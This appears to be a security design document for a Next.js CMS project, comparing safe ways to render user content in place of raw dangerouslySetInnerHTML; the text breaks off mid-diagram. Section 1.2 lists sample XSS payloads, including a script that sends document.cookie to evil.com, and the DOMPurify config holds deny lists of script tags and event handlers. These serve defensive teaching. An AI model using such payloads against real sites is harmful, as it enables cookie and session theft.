# dangerouslySetInnerHTML Security Solution

> Project: validate-nextjs-emotion | Version: 2.0 | Date: 2026-06-10

---

## Executive Summary & Recommendations

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│   SSR PERFORMANCE HIERARCHY:                                 │
│                                                             │
│   StructuredRenderer  ✅ Full SSR (Server Component)        │
│   MarkdownRenderer    ✅ Full SSR (Server Component)        │
│   RTERenderer         ⚠️ Partial SSR (needs 'use client')  │
│   SanitizedHTMLRender ❌ No SSR (client-side only)          │
│                                                             │
│   SECURITY HIERARCHY:                                        │
│                                                             │
│   StructuredRenderer  ✅ No HTML at all                     │
│   MarkdownRenderer    ✅ Safe text format                    │
│   RTERenderer         ✅ JSON AST (structured)              │
│   SanitizedHTMLRender ⚠️ Last resort (sanitized HTML)      │
│                                                             │
│   BOTTOM LINE:                                               │
│   Prefer Structured → Markdown → RTE JSON → DOMPurify      │
│   for both security AND SSR performance.                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 🏆 Solution Priority (by security & SSR quality)

| Priority | Solution | Security | SSR Quality | Use Case |
|----------|----------|----------|-------------|----------|
| 🥇 1st | **Structured Content** (Solution 1) | 🟢 No HTML at all | ✅ Full SSR | New CMS projects |
| 🥇 2nd | **Markdown Rendering** (Solution 3) | 🟢 Safe text format | ✅ Full SSR | Blogs, docs, comments |
| 🥈 3rd | **RTE JSON Rendering** (Solution 4) | 🟢 JSON AST | ⚠️ Partial SSR | Rich text editors |
| 🥉 4th | **DOMPurify Sanitization** (Solution 2) | 🟡 Sanitized HTML | ❌ No SSR | Legacy HTML migration |

> **⚠️ Current project status**: The only `dangerouslySetInnerHTML` usage is in `emotion-registry.tsx` (CSS-in-JS SSR), which is **safe** — it only processes library-generated CSS, never user input. See [Section 2](#2-current-status-analysis) for details.

### 🔒 Safe Patterns (already in project, no action needed)

| Component | Reason | File |
|-----------|--------|------|
| `EmotionRegistry` | CSS-only content, no user input | [src/lib/emotion-registry.tsx](src/lib/emotion-registry.tsx) |
| `styled-components registry` | Uses `getStyleElement()`, no `dangerouslySetInnerHTML` | [src/lib/styled-components-registry.tsx](src/lib/styled-components-registry.tsx) |

### 📊 Quick Decision Flow

```
Need to render CMS content?
├── Is the data structured JSON? → StructuredRenderer  (🥇 Best SSR + Security)
├── Is it Markdown text?         → MarkdownRenderer    (🥇 Best SSR + Security)
├── Is it RTE JSON (TipTap)?     → RTERenderer         (🥈 Good, needs 'use client')
└── Is it raw HTML (legacy)?     → SanitizedHTMLRender (🥉 Last resort, no SSR)
```

---

## Quick Navigation

| If you want to know... | Jump to... |
|------------------------|-------------|
| Is the current `dangerouslySetInnerHTML` usage safe? | [Current Status Analysis](#2-current-status-analysis) |
| How does SSR affect each rendering strategy? | [SSR Compatibility Matrix](#5-ssr-compatibility-matrix) |
| How to safely render CMS user content in SSR? | [Solution 1: Structured Content](#31-solution-1-structured-content-rendering-recommended) |
| How to handle legacy HTML data with SSR safety? | [Solution 2: DOMPurify Sanitization](#32-solution-2-dompurify-html-sanitization-alternative) |
| How to safely render blog articles in SSR? | [Solution 3: Markdown Rendering](#33-solution-3-markdown-rendering-best-for-blogs--docs) |
| How to use a rich text editor (TipTap) with SSR? | [Solution 4: RTE JSON Rendering](#34-solution-4-rte-json-rendering-best-for-rich-text-editing) |
| Which solution fits my scenario? | [Decision Matrix](#4-decision-matrix) |
| How are XSS attacks blocked? | [Appendix: XSS Attack Demo](#appendix-xss-attack-demo) |

---

## 1. Problem Overview

### 1.1 What is `dangerouslySetInnerHTML`?

This is a low-level React API that directly inserts HTML strings into the DOM. Unlike React's default rendering (which auto-escapes all text), this API tells React: **"Trust me, I know what I'm doing with this HTML."**

```tsx
// ⚠️ Dangerous mode: inserts HTML directly, React will NOT escape anything
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

**Why "dangerously"?** React's team deliberately chose this naming as a developer warning — this API bypasses React's built-in XSS (Cross-Site Scripting) protection. It is a **conscious escape hatch**, not something to use casually.

### 1.2 Why is this a Problem in CMS?

A CMS (Content Management System) is characterized by **user-generated content**. If user input contains malicious HTML, using `dangerouslySetInnerHTML` directly can lead to XSS attacks:

```html
<!-- User-submitted content might contain: -->
<script>
  // Steal cookies
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

<img src="x" onerror="executeMaliciousCode()" />

<a href="javascript:alert('XSS')">Click for surprise</a>

<iframe src="https://phishing-site.com/login"></iframe>

<style>
  body { display: none; }
</style>
```

> **Bottom line**: `dangerouslySetInnerHTML` itself is not a bug, but **using it on unsanitized user input** is a security vulnerability.

### 1.3 The Architecture of Our Solution

```
                     ┌─────────────────────────┐
                     │    CMS Content Source    │
                     └────────────┬────────────┘
                                  │
                     ┌────────────▼────────────┐
                     │   Content Type Router   │
                     └────────────┬────────────┘
                                  │
         ┌────────────────────────┼────────────────────────┐
         │                        │                        │
         ▼                        ▼                        ▼
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│  Structured     │    │  Markdown/RTE   │    │  DOMPurify      │
│  JSON Content   │    │  Text Content   │    │  HTML Content   │
│                 │    │                 │    │                 │
│  🥇 PREFERRED  │    │  🥇 PREFERRED  │    │  🥈 ALTERNATIVE │
└─────────────────┘    └─────────────────┘    └─────────────────┘
         │                        │                        │
         ▼                        ▼                        ▼
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│  React Component│    │  react-markdown │    │  DOMPurify      │
│  (No HTML!)     │    │  (Safe by def)  │    │  Sanitization   │
└─────────────────┘    └─────────────────┘    └─────────────────┘
         │                        │                        │
         └────────────────────────┼────────────────────────┘
                                  │
                         ┌────────▼────────┐
                         │   Safe DOM      │
                         │   (No XSS)      │
                         └─────────────────┘
```

---

## 2. Current Status Analysis

### 2.1 Existing `dangerouslySetInnerHTML` Usage in This Project

| # | Location | File | Content Source | Risk Level | Recommendation |
|---|----------|------|---------------|------------|----------------|
| 1 | `src/lib/emotion-registry.tsx` (line ~31) | [emotion-registry.tsx](src/lib/emotion-registry.tsx) | Emotion library internally generated CSS | ✅ **Low — no action needed** | Keep, add explanatory comment |
| 2 | `src/lib/styled-components-registry.tsx` | [styled-components-registry.tsx](src/lib/styled-components-registry.tsx) | Uses `getStyleElement()` returning React elements (does NOT use this API) | ✅ **No risk** | No action needed |
| 3 | Future CMS user-generated HTML | N/A (not yet in project) | Direct user input | ❌ **High risk** | Must use solutions in this doc |

### 2.2 Why Emotion Registry is Safe (Detailed Analysis)

```tsx
// src/lib/emotion-registry.tsx
'use client';

import { useState } from 'react';
import { CacheProvider } from '@emotion/react';
import createCache from '@emotion/cache';
import { useServerInsertedHTML } from 'next/navigation';

export default function EmotionRegistry({
  children,
}: {
  children: React.ReactNode;
}) {
  const [cache] = useState(() => {
    const cache = createCache({ key: 'css' });
    cache.compat = true;
    return cache;
  });

  useServerInsertedHTML(() => {
    // ↓↓↓ The only dangerouslySetInnerHTML usage in the project ↓↓↓
    const entries = cache.inserted;
    const styles = Object.keys(entries).map((key) => entries[key]);
    return (
      <style
        data-emotion={`${cache.key} ${Object.keys(entries).join(' ')}`}
        dangerouslySetInnerHTML={{ __html: styles.join('') }}
      />
    );
  });

  return <CacheProvider value={cache}>{children}</CacheProvider>;
}
```

**Three reasons this is safe:**

1. **Content Source** 🛡️ — `styles` data is entirely generated by the Emotion library's internal cache (`cache.inserted`). It contains only CSS class names and style rules that React components explicitly defined. No user input can reach this code path.

2. **Content Type** 🛡️ — The content is pure CSS code (e.g., `.css-abc123 { color: red; }`), not HTML with executable elements. CSS cannot contain executable `<script>` tags or event handlers.

3. **Technical Necessity** 🛡️ — In React SSR environments, `<style>` tags cannot use `children` for content because special characters in CSS (like `>`, `&`, `:`) would be auto-escaped by React's JSX escaping, breaking the styles. This is the **only** way to inject SSR styles, used by all CSS-in-JS libraries.

> This is the industry-standard pattern used by Emotion, styled-components, and MUI in their SSR registries. It is widely accepted as safe.

---

## 3. Solutions

### Core Principle

```
Prefer: Structured Data (JSON) → Text Format (Markdown) → Last Resort: Sanitized HTML
```

---

### 3.1 Solution 1: Structured Content Rendering (Recommended)

**Best for**: New CMS projects, content system refactoring from scratch

**Core idea**: Content is no longer stored as HTML strings, but split into **typed JSON data blocks**. Each block type maps to a corresponding React component that controls its own rendering.

#### Architecture

```
┌─────────────────────────────────────────────────────────┐
│                   CMS Database (JSON)                    │
│  ┌────────────┬────────────┬────────────┬────────────┐  │
│  │ Heading    │ Paragraph  │   Image    │    Code    │  │
│  │ {level:2,  │ {text:     │ {src, alt, │ {language,│  │
│  │  text:"Hi"}|  "body"}   │  caption}  │  code}    │  │
│  └────────────┴────────────┴────────────┴────────────┘  │
└──────────────────────┬──────────────────────────────────┘
                       │ JSON.parse()
                       ▼
┌─────────────────────────────────────────────────────────┐
│              StructuredRenderer (Router)                 │
│                                                          │
│  Paragraph → <ParagraphBlock data={...} />               │
│  Heading   → <HeadingBlock   data={...} />               │
│  Image     → <ImageBlock     data={...} />               │
│  Code      → <CodeBlock      data={...} />               │
│  List      → <ListBlock      data={...} />               │
│  Quote     → <QuoteBlock     data={...} />               │
│  Divider   → <DividerBlock   data={...} />               │
└─────────────────────────────────────────────────────────┘
```

#### Why This is the Safest Approach

```tsx
// ❌ DANGEROUS - HTML string approach
const html = '<h2>' + userInput.title + '</h2>';  // Can inject </h2><script>...
<div dangerouslySetInnerHTML={{ __html: html }} />

// ✅ SAFE - Structured JSON approach
const data = { level: 2, text: userInput.title };
// React auto-escapes: '<script>alert(1)</script>' → React text node → safe
<HeadingBlock data={data} />
```

**Key security properties:**

| Property | How it's achieved |
|----------|-------------------|
| **No HTML concatenation** | Content flows as JSON objects, never as HTML strings |
| **Auto-escaping** | React's text rendering automatically escapes `<`, `>`, `&`, `"`, `'` |
| **Component isolation** | Each block type has its own React component with controlled output |
| **Type safety** | TypeScript validates the shape of each block's data at compile time |

#### SSR Behavior

```tsx
// ✅ The StructuredRenderer is a SERVER COMPONENT (no 'use client')
// It renders on the server, producing HTML with all content embedded.
// No client-side hydration needed for the content itself.
//
// Server output: <div class="structured-content">
//                  <h2>Welcome</h2>
//                  <p>Body text...</p>
//                </div>
// ✓ FULL SSR: All content in initial HTML payload
// ✓ SSG Compatible: Pre-renders to static HTML at build time
// ✓ Zero client JS needed for content display

import { StructuredRenderer } from '@/components/structured-renderer';
// Note: No 'use client' — works in Server Components!

export default async function ArticlePage() {
  const content = await fetchContent(); // Fetch in Server Component
  return <StructuredRenderer content={content} />;
}
```

#### Usage Example

```tsx
import { StructuredRenderer } from '@/components/structured-renderer';

// CMS returns structured JSON content
const content = {
  blocks: [
    {
      id: '1',
      type: 'heading',
      data: { level: 2, text: 'Welcome to Our Blog' },
    },
    {
      id: '2',
      type: 'paragraph',
      data: { text: 'This is the article body content.' },
    },
    {
      id: '3',
      type: 'image',
      data: {
        src: 'https://images.unsplash.com/photo-1',
        alt: 'Beautiful landscape',
        caption: 'Photo by John Doe',
      },
    },
  ],
};

// Render directly - NO dangerouslySetInnerHTML needed!
<StructuredRenderer content={content} />
```

#### Available Block Components

| Component | Type | Purpose | Data Shape |
|-----------|------|---------|------------|
| `ParagraphBlock` | `paragraph` | Paragraph text with optional styling | `{ text: string }` |
| `HeadingBlock` | `heading` | Heading (h1-h6) | `{ level: 1-6, text: string }` |
| `ImageBlock` | `image` | Image with controlled attributes | `{ src, alt, caption? }` |
| `CodeBlock` | `code` | Code block with line numbers | `{ language, code }` |
| `ListBlock` | `list` | Ordered/unordered lists | `{ style: 'ordered'|'bullet', items[] }` |
| `QuoteBlock` | `quote` | Blockquote with optional attribution | `{ text, author? }` |
| `DividerBlock` | `divider` | Horizontal separator | `{ style? }` |

#### How to Extend: Add a New Block Type

Three simple steps:

```typescript
// Step 1: src/types/content.ts - Add type
export type ContentBlockType = 'paragraph' | 'heading' | 'image' | 'code' | 'list' | 'quote' | 'divider' | 'video';

// Step 2: src/components/blocks/video-block.tsx - Create component
'use client';
import { VideoBlockData } from '@/types/content';

export function VideoBlock({ data }: { data: VideoBlockData }) {
  return (
    <div className="video-wrapper">
      <video
        src={data.src}
        controls
        poster={data.poster}
        width="100%"
      />
      {data.caption && <p className="caption">{data.caption}</p>}
    </div>
  );
}

// Step 3: src/lib/content-registry.tsx - Register
import { VideoBlock } from "@/components/blocks/video-block";

export const BLOCK_REGISTRY = {
  video: VideoBlock,
  paragraph: ParagraphBlock,
  heading: HeadingBlock,
  // ... existing types
} as const;
```

#### Key Implementation: Content Registry Pattern

```tsx
// src/lib/content-registry.tsx
import type { ContentBlock, ContentBlockType } from "@/types/content";

// Registry: maps block type → React component
export const BLOCK_REGISTRY: Record<ContentBlockType, React.ComponentType<{
  data: ContentBlock['data'];
}>> = {
  paragraph: ParagraphBlock,
  heading: HeadingBlock,
  image: ImageBlock,
  code: CodeBlock,
  list: ListBlock,
  quote: QuoteBlock,
  divider: DividerBlock,
};

// Render function: type-safe lookup
export function renderBlock(block: ContentBlock): React.ReactNode {
  const Component = BLOCK_REGISTRY[block.type];
  if (!Component) {
    console.warn(`Unknown block type: ${block.type}`);
    return null;
  }
  return <Component key={block.id} data={block.data} />;
}
```

---

### 3.2 Solution 2: DOMPurify HTML Sanitization (Alternative)

**Best for**: Legacy HTML data migration, third-party HTML content integration, gradual migration

**Core idea**: If you must use HTML (e.g., migrating existing content), **wash away all dangerous parts** using the DOMPurify library before injecting into the DOM.

#### How DOMPurify Works

DOMPurify is a library developed by Cure53 (a renowned security research firm) that parses HTML through the browser's native DOMParser and removes anything dangerous:

```
Input:  <h2>Safe Title</h2><script>alert('XSS')</script><img src=x onerror=attack(1)>
                                                      │
                                                      ▼
                                    ┌─────────────────────────────┐
                                    │      DOMPurify Engine       │
                                    │                             │
                                    │  1. Parse via DOMParser     │
                                    │  2. Walk DOM tree           │
                                    │  3. Check each node         │
                                    │  4. Remove dangerous nodes  │
                                    │  5. Serialize back to HTML  │
                                    └─────────────────────────────┘
                                                      │
                                                      ▼
Output: <h2>Safe Title</h2><img src="x">
```

#### SSR Behavior (Critical!)

```tsx
// ╔════════════════════════════════════════════════════════════════════╗
// ║              SSR RENDERING FLOW FOR SANITIZED HTML               ║
// ╠════════════════════════════════════════════════════════════════════╣
// ║                                                                    ║
// ║  1. SSR Render (Server)                                            ║
// ║     ↓ <SanitizedHTMLRenderer html={...} />                         ║
// ║     ↓ Component renders → returns null (no HTML yet)               ║
// ║     ↓ Server sends page HTML WITHOUT the user content              ║
// ║                                                                    ║
// ║  2. Hydration (Browser)                                            ║
// ║     ↓ React hydrates the page                                       ║
// ║     ↓ useEffect fires → calls sanitizeHTML(html)                   ║
// ║     ↓ DOMPurify sanitizes the HTML (in browser DOM)                ║
// ║     ↓ setState triggers re-render with sanitized content           ║
// ║     ↓ Content appears in the browser                               ║
// ║                                                                    ║
// ║  ⚠️  KEY TRADEOFF: Content does NOT appear in SSR HTML             ║
// ║     This means the raw HTML is never in the server response.       ║
// ║     Content is rendered AFTER JavaScript loads.                    ║
// ║                                                                    ║
// ╚════════════════════════════════════════════════════════════════════╝

// Async sanitizeHTML() — works in SSR but content is client-rendered
import { sanitizeHTML } from '@/lib/sanitize-html';
// ↑ Uses isomorphic-dompurify, graceful server degradation

// Sync sanitizeHTMLSync() — client-only, avoids hydration mismatch
import { sanitizeHTMLSync } from '@/lib/sanitize-html';
// ↑ Uses browser dompurify, throws warning if called on server

// Why async? DOMPurify requires the DOM's DOMParser API.
// isomorphic-dompurify provides a shim, but it's not 100% reliable.
// The safest approach: sanitize on the client, never expose raw HTML.
```

#### Security Configuration

All sanitization rules are defined in `src/lib/sanitize-config.ts`:

```typescript
// src/lib/sanitize-config.ts
import type { Config } from 'dompurify';

export const SANITIZE_CONFIG: Config = {
  // ✅ Tags that are ALLOWED (everything else is stripped)
  ALLOWED_TAGS: [
    // Text formatting
    'p', 'br', 'strong', 'b', 'em', 'i', 'u', 's', 'sub', 'sup',
    'span', 'div', 'pre', 'code',
    // Headings
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    // Lists
    'ul', 'ol', 'li',
    // Links and media
    'a', 'img',
    // Block elements
    'blockquote', 'hr', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
  ],

  // ❌ Tags that are EXPLICITLY FORBIDDEN (extra safety layer)
  FORBID_TAGS: [
    'script', 'style', 'iframe', 'object', 'embed', 'form',
    'input', 'button', 'select', 'textarea', 'meta', 'link',
    'base', 'frameset', 'frame', 'applet', 'canvas',
  ],

  // ❌ Attributes that are EXPLICITLY FORBIDDEN
  FORBID_ATTR: [
    // Event handlers (primary XSS vector)
    'onerror', 'onload', 'onclick', 'onmouseover', 'onmouseout',
    'onfocus', 'onblur', 'onchange', 'onsubmit', 'onkeydown',
    'onkeyup', 'onkeypress', 'onscroll', 'onresize', 'onabort',
    'onbeforeunload', 'onhashchange', 'onpopstate', 'onstorage',
    // Dangerous attributes
    'style',  // CSS-based attacks
    'srcdoc', 'sandbox',  // iframe-related (even though iframe is forbidden)
  ],

  // ✅ HTML5-specific settings
  ADD_ATTR: ['target', 'rel'],  // Allow these specific attributes for links

  // ✅ Protocol allowlist for URLs
  ALLOWED_URI_REGEXP: /^(?:(?:https?|ftp|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.-:]|$))/i,
  // Only allows: http://, https://, ftp://, mailto:
  // Blocks: javascript:, data:, vbscript:, file:,
};
```

#### SSR-Safe Sanitization

```typescript
// src/lib/sanitize-html.ts
/**
 * SSR-Safe HTML Sanitization Utility.
 *
 * Uses isomorphic-dompurify which works in both server and client environments.
 * Falls back to a no-op in environments where DOMPurify is unavailable.
 */

import { SANITIZE_CONFIG } from './sanitize-config';
import type DOMPurify from 'dompurify';

let purifyInstance: typeof DOMPurify | null = null;

/**
 * Lazy-loads DOMPurify with SSR compatibility.
 * - Server-side: uses isomorphic-dompurify
 * - Client-side: uses browser dompurify
 */
async function getPurify(): Promise<typeof DOMPurify> {
  if (purifyInstance) return purifyInstance;

  if (typeof window !== 'undefined') {
    // Client-side: use browser DOMPurify
    const dompurify = await import('dompurify');
    purifyInstance = dompurify.default;
  } else {
    // Server-side: use isomorphic-dompurify
    const dompurify = await import('isomorphic-dompurify');
    purifyInstance = dompurify.default as unknown as typeof DOMPurify;
  }

  return purifyInstance;
}

/**
 * Sanitize HTML string for safe rendering (async, SSR-compatible).
 */
export async function sanitizeHTML(html: string): Promise<string> {
  if (!html) return '';
  try {
    const purify = await getPurify();
    const result = purify.sanitize(html, SANITIZE_CONFIG);
    return typeof result === 'string' ? result : '';
  } catch (error) {
    console.error('[sanitizeHTML] DOMPurify sanitization failed:', error);
    return '';
  }
}

/**
 * Synchronous version for use in hooks/memoization.
 * Only works in browser environments.
 */
export function sanitizeHTMLSync(html: string): string {
  if (!html) return '';
  if (typeof window === 'undefined') {
    console.warn(
      '[sanitizeHTMLSync] Called on server. Use sanitizeHTML (async) instead. Returning empty string for safety.'
    );
    return '';
  }
  try {
    const dompurify = require('dompurify');
    const result = dompurify.sanitize(html, SANITIZE_CONFIG);
    return typeof result === 'string' ? result : '';
  } catch (error) {
    console.error('[sanitizeHTMLSync] DOMPurify sanitization failed:', error);
    return '';
  }
}
```

#### Usage in a Component (SSR-Safe)

```tsx
'use client';

import { useState, useEffect } from 'react';
import { sanitizeHTML } from '@/lib/sanitize-html';

// Option A: Async SSR-safe SanitizedHTMLRenderer (recommended)
import { SanitizedHTMLRenderer } from '@/components/sanitized-html-renderer';

// Three modes:
// 'auto'   (default): async sanitizeHTML() — SSR-compatible, content after hydration
// 'ssr'              : force async path
// 'client'           : sync path for client-only (faster)
<SanitizedHTMLRenderer html={userInput} mode="auto" />

// Option B: Manual async approach
function SafeHTMLRenderer({ html }: { html: string }) {
  const [clean, setClean] = useState('');
  useEffect(() => {
    sanitizeHTML(html).then(setClean);
  }, [html]);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

> **⚠️ Important Caveat**: This solution still uses `dangerouslySetInnerHTML` under the hood, but ONLY after the HTML has been thoroughly sanitized. This is the **last resort** — use it only when Solutions 1 or 3 are not feasible. Content does not appear in SSR HTML — it renders client-side after hydration.

---

### 3.3 Solution 3: Markdown Rendering (Best for Blogs / Docs)

**Best for**: Blog posts, documentation pages, user comments, forum posts

**Core idea**: Markdown is an **inherently safe text format** — it has no ability to execute JavaScript. It only supports text formatting, links, images, and code blocks through a controlled syntax.

#### Why Markdown is Naturally Safe

| Capability | Markdown Syntax | Can it execute JS? |
|------------|-----------------|-------------------|
| Bold text | `**text**` | ❌ No |
| Italic text | `*text*` | ❌ No |
| Links | `[text](url)` | ❌ No (built-in safety) |
| Images | `![alt](src)` | ❌ No (controlled output) |
| Code blocks | ````code```` | ❌ No (displayed as text) |
| Headings | `# Title` | ❌ No |
| Lists | `- item` / `1. item` | ❌ No |
| Tables | `\| col \| col \|` | ❌ No |
| HTML injection | `<script>` | ❌ Stripped by rehype-sanitize |
| Event handlers | `onerror=` | ❌ Stripped by rehype-sanitize |

#### Security Architecture

```
User Markdown Input
    │
    ▼
┌─────────────────────┐
│  remark (parser)    │  → Parses markdown to mdast (Markdown AST)
│  remark-gfm         │  → GitHub Flavored Markdown support
└─────────┬───────────┘
          ▼
┌─────────────────────┐
│  rehype (compiler)  │  → Converts mdast to hast (HTML AST)
└─────────┬───────────┘
          ▼
┌─────────────────────┐
│  rehype-sanitize    │  🛡️ SECURITY LAYER: Strips dangerous HTML
└─────────┬───────────┘
          ▼
┌─────────────────────┐
│  react-markdown     │  → Renders hast as React components
│  (React, not HTML!) │  → All text goes through React's escaping
└─────────────────────┘
          ▼
     Safe DOM Content
```

#### SSR Behavior

```tsx
// ✅ MarkdownRenderer is a SERVER COMPONENT (no 'use client' directive)
// react-markdown works fully on the server. It parses markdown to an AST
// and renders React elements — no browser APIs needed.
//
// SSR output: <div class="markdown-content">
//               <h1>Title</h1>
//               <p><strong>Bold</strong> text</p>
//               <pre><code>Code here</code></pre>
//             </div>
// ✓ FULL SSR: All content embedded in initial HTML
// ✓ SSG Compatible: Pre-renders to static HTML at build time
// ✓ Zero client-side rendering needed

import { MarkdownRenderer } from '@/components/markdown-renderer';
// Note: No 'use client' — works in any Server Component!

export default async function BlogPage() {
  const content = await fetchMarkdown(); // Fetch on server
  return <MarkdownRenderer content={content} />;
  // → All HTML sent to browser in initial payload
}
```

#### Implementation

```tsx
// src/components/markdown-renderer.tsx
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import rehypeSanitize from 'rehype-sanitize';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { oneDark } from 'react-syntax-highlighter/dist/esm/styles/prism';

interface MarkdownRendererProps {
  content: string;         // Raw markdown string
  className?: string;      // Optional additional classes
}

export function MarkdownRenderer({
  content,
  className = '',
}: MarkdownRendererProps) {
  if (!content) return null;

  return (
    <div className={`markdown-content ${className}`}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[rehypeSanitize]}
        // 🛡️ Link security: all links open in new tab with noopener
        linkTarget="_blank"
        // 🛡️ Custom link component for extra safety
        components={{
          a: ({ href, children }) => (
            <a
              href={href}
              target="_blank"
              rel="noopener noreferrer nofollow"
            >
              {children}
            </a>
          ),
          img: ({ src, alt }) => (
            <img
              src={src}
              alt={alt || ''}
              loading="lazy"
              // 🛡️ No onerror, no onclick — only safe attributes
            />
          ),
          code: ({ className, children, ...props }) => {
            const match = /language-(\w+)/.exec(className || '');
            const isInline = !match;
            return isInline ? (
              <code {...props}>{children}</code>
            ) : (
              <SyntaxHighlighter
                style={oneDark}
                language={match[1]}
                PreTag="div"
              >
                {String(children).replace(/\n$/, '')}
              </SyntaxHighlighter>
            );
          },
        }}
      >
        {content}
      </ReactMarkdown>
    </div>
  );
}
```

#### Usage Example

```tsx
import { MarkdownRenderer } from '@/components/markdown-renderer';

const blogPost = `
# Getting Started with Next.js

Next.js is a **React framework** for production.

## Features

- ✅ **Server-side Rendering** — Pages are rendered on the server
- ✅ **Static Site Generation** — Pages are pre-built at build time
- ✅ **File-based Routing** — No configuration needed

## Code Example

\`\`\`typescript
// This is displayed as text, NEVER executed
const greeting: string = "Hello, World!";
console.log(greeting);
\`\`\`

## Image

![Next.js Logo](https://nextjs.org/static/blog/next-13-1/twitter-card.png)

> **Try it yourself**: The code above will never execute because react-markdown
> renders it as plain text, not as an active script!
`;

export default function BlogPage() {
  return <MarkdownRenderer content={blogPost} />;
}
```

---

### 3.4 Solution 4: RTE JSON Rendering (Best for Rich Text Editing)

**Best for**: Content requiring rich text editing — news articles, editorial content, knowledge base pages

**Core idea**: Modern rich text editors (TipTap, Slate.js, Lexical by Facebook) output **JSON ASTs (Abstract Syntax Trees)** by default, not HTML strings. This makes rendering naturally safe because the content is structured data, not markup.

#### Correct vs Incorrect RTE Patterns

```tsx
// ❌ WRONG PATTERN — Extremely Dangerous
const html = editor.getHTML();
// ↑ Returns raw HTML: <p>Hello <script>alert('xss')</script></p>
<div dangerouslySetInnerHTML={{ __html: html }} />
// ↑ User could type script tags in the editor!

// ✅ CORRECT PATTERN — Safe by Design
const json = editor.getJSON();
// ↑ Returns structured JSON:
//   { type: "doc", content: [{ type: "paragraph", content: [
//     { type: "text", text: "Hello " },
//     { type: "text", text: "</p><script>alert('xss')</script>" }
//   ]}]}
//   ↑ User's malicious input is escaped text, not executable markup!
<RTERenderer content={json} />
```

#### SSR Behavior

```tsx
// ⚠️ RTERenderer has 'use client' directive (needs React.createElement)
//
// SSR output: <div class="rte-content">
//               <h2>Article Title</h2>
//               <p>Body text...</p>
//             </div>
// ✓ SSR works because the JSON data is passed as props
// ✓ The client directive is needed for dynamic element creation
// ✓ Content IS embedded in SSR HTML
//
// ⚠️ If Block-level child components use Emotion css() prop,
//    each child must be a Client Component or wrap with 'use client'.

'use client'; // Required for React.createElement dynamic tags

import { RTERenderer } from '@/components/rte-renderer';

// Works in any page, renders content on server
<RTERenderer content={rteJson} />
```

#### Understanding the JSON AST

TipTap (based on ProseMirror) represents content as a JSON tree:

```json
{
  "type": "doc",
  "content": [
    {
      "type": "heading",
      "attrs": { "level": 2 },
      "content": [
        { "type": "text", "text": "Article Title" }
      ]
    },
    {
      "type": "paragraph",
      "content": [
        {
          "type": "text",
          "marks": [{ "type": "bold" }],
          "text": "Bold text here"
        },
        {
          "type": "text",
          "text": " - normal text here"
        }
      ]
    },
    {
      "type": "paragraph",
      "content": [
        {
          "type": "text",
          "marks": [
            { "type": "link", "attrs": { "href": "https://example.com" } }
          ],
          "text": "Click here"
        }
      ]
    }
  ]
}
```

**Every text node is just a string** — there is no way for a user to inject HTML tags because the structure is dictated by the JSON schema, not by string concatenation.

#### RTE Renderer Implementation

```tsx
// src/components/rte-renderer.tsx
'use client';

import { useMemo } from 'react';
import { generateHTML } from '@tiptap/react';
import StarterKit from '@tiptap/starter-kit';
import ImageExtension from '@tiptap/extension-image';
import LinkExtension from '@tiptap/extension-link';
import { sanitizeHTML } from '@/lib/sanitize-html';

interface RTERendererProps {
  content: Record<string, unknown> | string;  // TipTap JSON or HTML fallback
  className?: string;
}

export function RTERenderer({
  content,
  className = '',
}: RTERendererProps) {
  // Check if content is JSON (preferred) or legacy HTML
  const isJSON = typeof content === 'object' && content !== null;

  return (
    <div className={`rte-content ${className}`}>
      {isJSON ? (
        <JSONRenderer json={content as Record<string, unknown>} />
      ) : (
        <LegacyHTMLRenderer html={content as string} />
      )}
    </div>
  );
}

/** Renders TipTap JSON content as React elements */
function JSONRenderer({ json }: { json: Record<string, unknown> }) {
  const rendered = useMemo(() => {
    try {
      // Convert TipTap JSON back to HTML
      const html = generateHTML(json as any, [
        StarterKit.configure({
          heading: { levels: [1, 2, 3, 4, 5, 6] },
          codeBlock: true,
          bulletList: true,
          orderedList: true,
          blockquote: true,
          horizontalRule: true,
        }),
        ImageExtension,
        LinkExtension.configure({
          openOnClick: false,
          HTMLAttributes: {
            rel: 'noopener noreferrer nofollow',
            target: '_blank',
          },
        }),
      ]);
      return html;
    } catch {
      return '';
    }
  }, [json]);

  // The HTML is generated from controlled JSON → safe to render
  return <div dangerouslySetInnerHTML={{ __html: rendered }} />;
}

/** Renders legacy HTML with DOMPurify sanitization */
function LegacyHTMLRenderer({ html }: { html: string }) {
  return <SanitizedHTMLRenderer html={html} />;
}
```

> **Performance note**: `generateHTML` uses `useMemo` to avoid re-computation on every render. The JSON → HTML conversion is deterministic.

---

## 5. SSR Compatibility Matrix

This is a critical consideration for Next.js App Router. Each solution has different SSR characteristics:

| Solution | SSR HTML Output | Client JS Required | SSG Compatible | 'use client' Needed | Notes |
|----------|----------------|-------------------|----------------|---------------------|-------|
| **StructuredRenderer** | ✅ **Full HTML** — all content in initial payload | ❌ No (React elements) | ✅ Yes | ❌ No (Server Component) | 🥇 **Best SSR — content visible instantly** |
| **MarkdownRenderer** | ✅ **Full HTML** — fully rendered on server | ❌ No (react-markdown) | ✅ Yes | ❌ No (Server Component) | 🥇 **Best SSR — content visible instantly** |
| **RTERenderer** | ⚠️ **Partial SSR** — generates HTML from JSON, but needs 'use client' | ✅ Yes (hydration) | ✅ Yes | ✅ Yes | 🥈 Good — content in SSR, but extra client bundle |
| **SanitizedHTMLRenderer** | ❌ **No HTML in SSR** — renders `null`, content after hydration | ✅ Yes (useEffect) | ⚠️ No (client-only) | ✅ Yes | 🥉 **Last resort** — content NOT in SSR HTML |
| **EmotionRegistry** | ✅ **CSS in `<head>`** — fully styled HTML | ⚠️ Minimal (hydration + style injection) | ✅ Yes | ✅ Yes | 🟢 **Safe pattern** — industry standard |

### SSR Decision Flow

```
                    ┌──────────────────────────────────┐
                    │   "Must content be visible in    │
                    │    SSR HTML?"                     │
                    └──────────┬──────────┬───────────┘
